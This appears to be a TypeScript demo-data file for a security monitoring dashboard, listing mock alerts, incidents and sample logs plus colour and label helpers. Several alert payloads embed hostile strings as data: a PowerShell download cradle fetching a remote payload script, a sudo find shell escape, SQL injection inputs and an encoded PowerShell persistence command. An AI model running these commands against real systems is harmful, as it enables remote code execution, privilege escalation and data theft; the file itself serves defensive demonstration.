import type { ThreatDetectionResult } from './threatDetection';

export interface DemoAlert {
  title: string;
  source: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  status: 'new' | 'triaged' | 'escalated' | 'closed';
  threat_type: string;
  confidence: number;
  raw_payload: Record<string, unknown>;
}

export interface DemoIncident {
  title: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  status: 'open' | 'investigating' | 'contained' | 'resolved' | 'closed';
  attack_vector: string;
  impact_score: number;
  ai_summary: string;
}

export const DEMO_ALERTS: DemoAlert[] = [
  {
    title: 'Brute Force Attack on SSH Service',
    source: 'IDS/Suricata',
    severity: 'critical',
    status: 'escalated',
    threat_type: 'brute_force',
    confidence: 0.92,
    raw_payload: {
      source_ip: '185.220.101.34',
      dest_ip: '10.0.1.50',
      dest_port: 22,
      protocol: 'SSH',
      attempts: 2847,
      timeframe: '2h 15m',
      usernames_targeted: ['root', 'admin', 'ubuntu', 'deploy', 'oracle'],
      first_seen: '2026-06-12T02:15:00Z',
      last_seen: '2026-06-12T04:30:00Z',
    },
  },
  {
    title: 'SQL Injection - UNION SELECT on /api/users',
    source: 'WAF/CloudFlare',
    severity: 'critical',
    status: 'new',
    threat_type: 'sql_injection',
    confidence: 0.88,
    raw_payload: {
      source_ip: '45.33.32.156',
      url: '/api/users?id=1 UNION SELECT password FROM admins--',
      method: 'GET',
      response_code: 403,
      user_agent: 'sqlmap/1.7.2',
      payload: "1' UNION SELECT username,password FROM users--",
      blocked: true,
      timestamp: '2026-06-12T06:45:12Z',
    },
  },
  {
    title: 'Suspicious Login - Impossible Travel',
    source: 'Azure AD',
    severity: 'high',
    status: 'triaged',
    threat_type: 'suspicious_login',
    confidence: 0.85,
    raw_payload: {
      username: 'j.smith@company.com',
      login_1: { ip: '203.0.113.50', location: 'New York, US', time: '2026-06-12T08:00:00Z' },
      login_2: { ip: '91.134.22.18', location: 'Moscow, RU', time: '2026-06-12T08:35:00Z' },
      travel_time: '35min',
      actual_distance: '7500km',
      impossible: true,
    },
  },
  {
    title: 'Malware C2 Beacon Detected',
    source: 'Network Monitor',
    severity: 'high',
    status: 'new',
    threat_type: 'c2_communication',
    confidence: 0.79,
    raw_payload: {
      source_ip: '10.0.2.105',
      dest_ip: '91.215.85.42',
      dest_port: 443,
      protocol: 'HTTPS',
      beacon_interval: '60s',
      jitter: '15%',
      dns_lookup: 'update-service.darkcloud.xyz',
      first_seen: '2026-06-11T22:00:00Z',
      bytes_out: 24576,
      bytes_in: 1024,
    },
  },
  {
    title: 'Privilege Escalation via sudo Misconfiguration',
    source: 'EDR/CrowdStrike',
    severity: 'high',
    status: 'triaged',
    threat_type: 'privilege_escalation',
    confidence: 0.91,
    raw_payload: {
      host: 'web-prod-03',
      user: 'www-data',
      command: 'sudo find / -exec /bin/bash \\;',
      sudoers_entry: 'www-data ALL=(ALL) NOPASSWD: /usr/bin/find',
      detected_by: 'process_monitoring',
      timestamp: '2026-06-12T03:22:15Z',
    },
  },
  {
    title: 'Credential Dumping - LSASS Access',
    source: 'EDR/CrowdStrike',
    severity: 'critical',
    status: 'escalated',
    threat_type: 'credential_dumping',
    confidence: 0.95,
    raw_payload: {
      host: 'DC-01',
      process: 'mimikatz.exe',
      target_process: 'lsass.exe',
      access_type: 'PROCESS_VM_READ',
      user: 'SVC-Backup',
      timestamp: '2026-06-12T01:45:00Z',
      hashes_extracted: 12,
    },
  },
  {
    title: 'Data Exfiltration via DNS Tunnel',
    source: 'DNS Monitor',
    severity: 'medium',
    status: 'new',
    threat_type: 'exfiltration',
    confidence: 0.67,
    raw_payload: {
      source_ip: '10.0.3.22',
      domain: 'data.x7f3.tunnel.attacker.net',
      query_count: 15420,
      avg_label_length: 63,
      total_bytes: 975480,
      timeframe: '6h',
      timestamp: '2026-06-12T00:00:00Z',
    },
  },
  {
    title: 'Ransomware Activity - File Encryption Detected',
    source: 'File Integrity Monitor',
    severity: 'critical',
    status: 'escalated',
    threat_type: 'ransomware',
    confidence: 0.97,
    raw_payload: {
      host: 'FILE-SVR-02',
      encrypted_files: 2847,
      encryption_extension: '.lock3d',
      ransom_note: 'READ_ME_FOR_DECRYPT.txt',
      bitcoin_address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
      demand_amount: '2.5 BTC',
      timestamp: '2026-06-12T05:00:00Z',
    },
  },
  {
    title: 'Lateral Movement via RDP Brute Force',
    source: 'Windows Event Log',
    severity: 'high',
    status: 'new',
    threat_type: 'lateral_movement',
    confidence: 0.82,
    raw_payload: {
      source_host: 'WORKSTATION-07',
      dest_host: 'DC-01',
      protocol: 'RDP',
      failed_attempts: 156,
      source_ip: '10.0.5.22',
      dest_ip: '10.0.1.10',
      timestamp: '2026-06-12T04:15:00Z',
    },
  },
  {
    title: 'Phishing Email - Credential Harvesting',
    source: 'Email Gateway',
    severity: 'medium',
    status: 'triaged',
    threat_type: 'phishing',
    confidence: 0.73,
    raw_payload: {
      sender: 'it-support@micr0soft-secure.com',
      subject: 'Urgent: Password Reset Required',
      recipients: 342,
      link: 'https://micr0soft-secure.com/login',
      reported_by: 15,
      clicked: 47,
      timestamp: '2026-06-12T07:30:00Z',
    },
  },
  {
    title: 'Scheduled Task Creation for Persistence',
    source: 'Sysmon',
    severity: 'medium',
    status: 'new',
    threat_type: 'persistence',
    confidence: 0.65,
    raw_payload: {
      host: 'WEB-PROD-01',
      task_name: 'WindowsUpdate',
      command: 'powershell -enc JABjAD0...',
      user: 'SYSTEM',
      run_at: 'logon',
      timestamp: '2026-06-12T02:30:00Z',
    },
  },
  {
    title: 'Suspicious PowerShell Download Cradle',
    source: 'EDR/CrowdStrike',
    severity: 'high',
    status: 'new',
    threat_type: 'execution',
    confidence: 0.87,
    raw_payload: {
      host: 'WORKSTATION-12',
      command: 'IEX (New-Object Net.WebClient).DownloadString("http://45.33.32.156/payload.ps1")',
      parent_process: 'cmd.exe',
      user: 'j.doe',
      timestamp: '2026-06-12T06:10:00Z',
    },
  },
];

export const DEMO_INCIDENTS: DemoIncident[] = [
  {
    title: 'Active Brute Force Campaign Against SSH Infrastructure',
    description: 'Coordinated brute force attack targeting SSH services across production infrastructure. Multiple source IPs involved, indicating botnet activity. 2847 failed attempts detected in 2 hours.',
    severity: 'critical',
    status: 'investigating',
    attack_vector: 'External - SSH brute force from botnet IPs',
    impact_score: 9,
    ai_summary: 'A distributed brute force campaign is actively targeting SSH endpoints. The attack originates from known Tor exit nodes and compromised IoT devices. Pattern analysis suggests automated credential stuffing using leaked credential databases. No successful compromises detected yet, but the volume and persistence suggest a sophisticated actor.',
  },
  {
    title: 'SQL Injection Attack on User Management API',
    description: 'Multiple SQL injection attempts detected against the /api/users endpoint. Attacker using sqlmap tool. WAF successfully blocked initial attempts, but secondary evasion techniques observed.',
    severity: 'critical',
    status: 'open',
    attack_vector: 'External - Web application SQL injection',
    impact_score: 8,
    ai_summary: 'An attacker is systematically probing the user management API with SQL injection payloads. While the WAF has blocked direct attacks, secondary encoded payloads and time-based blind injection attempts suggest a skilled attacker. Immediate code review of the parameterized query implementation is recommended.',
  },
  {
    title: 'Impossible Travel - Compromised Executive Account',
    description: 'Executive account j.smith@company.com accessed from New York and Moscow within 35 minutes. Impossible travel pattern confirmed. Credential compromise suspected.',
    severity: 'high',
    status: 'contained',
    attack_vector: 'Credential compromise via phishing',
    impact_score: 7,
    ai_summary: 'Analysis of the impossible travel alert confirms credential compromise. The Moscow login used a valid session token, likely obtained through the phishing campaign detected on 2026-06-12. Account has been temporarily locked, and MFA enforcement is pending. All actions taken by the compromised session are being audited.',
  },
  {
    title: 'Ransomware Deployment on File Server',
    description: 'Lock3D ransomware detected on FILE-SVR-02. 2847 files encrypted with .lock3d extension. Ransom note demands 2.5 BTC. Spread via lateral movement from compromised workstation.',
    severity: 'critical',
    status: 'contained',
    attack_vector: 'Lateral movement via RDP → ransomware deployment',
    impact_score: 10,
    ai_summary: 'Full attack chain reconstructed: Initial access via phishing → credential harvesting → lateral movement via RDP to file server → privilege escalation → ransomware deployment. The attack spans approximately 6 hours from initial compromise to encryption. Backup systems are intact and isolated. Decryption keys not yet available.',
  },
];

export const DEMO_SAMPLE_LOGS = `{"timestamp":"2026-06-12T02:15:01Z","source_ip":"185.220.101.34","dest_ip":"10.0.1.50","action":"login","status":"failed","username":"root","dest_port":22}
{"timestamp":"2026-06-12T02:15:02Z","source_ip":"185.220.101.34","dest_ip":"10.0.1.50","action":"login","status":"failed","username":"admin","dest_port":22}
{"timestamp":"2026-06-12T02:15:03Z","source_ip":"185.220.101.34","dest_ip":"10.0.1.50","action":"login","status":"failed","username":"ubuntu","dest_port":22}
{"timestamp":"2026-06-12T02:15:05Z","source_ip":"185.220.101.34","dest_ip":"10.0.1.50","action":"login","status":"failed","username":"deploy","dest_port":22}
{"timestamp":"2026-06-12T02:15:07Z","source_ip":"185.220.101.34","dest_ip":"10.0.1.50","action":"login","status":"failed","username":"oracle","dest_port":22}
{"timestamp":"2026-06-12T06:45:12Z","source_ip":"45.33.32.156","url":"/api/users?id=1 UNION SELECT password FROM admins--","method":"GET","response_code":403,"user_agent":"sqlmap/1.7.2"}
{"timestamp":"2026-06-12T06:45:15Z","source_ip":"45.33.32.156","url":"/api/users?id=1' OR 1=1--","method":"POST","response_code":403,"user_agent":"sqlmap/1.7.2"}
{"timestamp":"2026-06-12T06:45:18Z","source_ip":"45.33.32.156","url":"/api/login","method":"POST","response_code":200,"query":"username=admin'--&password=x","user_agent":"sqlmap/1.7.2"}
{"timestamp":"2026-06-12T08:00:00Z","source_ip":"203.0.113.50","action":"login","status":"success","username":"j.smith@company.com","user_agent":"Chrome/126.0"}
{"timestamp":"2026-06-12T08:35:00Z","source_ip":"91.134.22.18","action":"login","status":"success","username":"j.smith@company.com","user_agent":"Firefox/127.0"}
{"timestamp":"2026-06-12T09:10:00Z","source_ip":"91.134.22.18","action":"login","status":"success","username":"j.smith@company.com","user_agent":"python-requests/2.32.0"}`;

export function getSeverityColor(severity: string): string {
  switch (severity) {
    case 'critical': return 'text-red-400';
    case 'high': return 'text-orange-400';
    case 'medium': return 'text-yellow-400';
    case 'low': return 'text-blue-400';
    case 'info': return 'text-slate-400';
    default: return 'text-slate-400';
  }
}

export function getSeverityBg(severity: string): string {
  switch (severity) {
    case 'critical': return 'bg-red-500/20 border-red-500/40';
    case 'high': return 'bg-orange-500/20 border-orange-500/40';
    case 'medium': return 'bg-yellow-500/20 border-yellow-500/40';
    case 'low': return 'bg-blue-500/20 border-blue-500/40';
    case 'info': return 'bg-slate-500/20 border-slate-500/40';
    default: return 'bg-slate-500/20 border-slate-500/40';
  }
}

export function getStatusColor(status: string): string {
  switch (status) {
    case 'new': return 'text-cyan-400';
    case 'triaged': return 'text-blue-400';
    case 'escalated': return 'text-red-400';
    case 'open': return 'text-emerald-400';
    case 'investigating': return 'text-yellow-400';
    case 'contained': return 'text-orange-400';
    case 'resolved': return 'text-green-400';
    case 'closed': return 'text-slate-400';
    default: return 'text-slate-400';
  }
}

export function getThreatTypeLabel(type: string): string {
  switch (type) {
    case 'brute_force': return 'Brute Force';
    case 'sql_injection': return 'SQL Injection';
    case 'suspicious_login': return 'Suspicious Login';
    case 'c2_communication': return 'C2 Communication';
    case 'privilege_escalation': return 'Privilege Escalation';
    case 'credential_dumping': return 'Credential Dumping';
    case 'exfiltration': return 'Data Exfiltration';
    case 'ransomware': return 'Ransomware';
    case 'lateral_movement': return 'Lateral Movement';
    case 'phishing': return 'Phishing';
    case 'persistence': return 'Persistence';
    case 'execution': return 'Execution';
    default: return type.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
  }
}
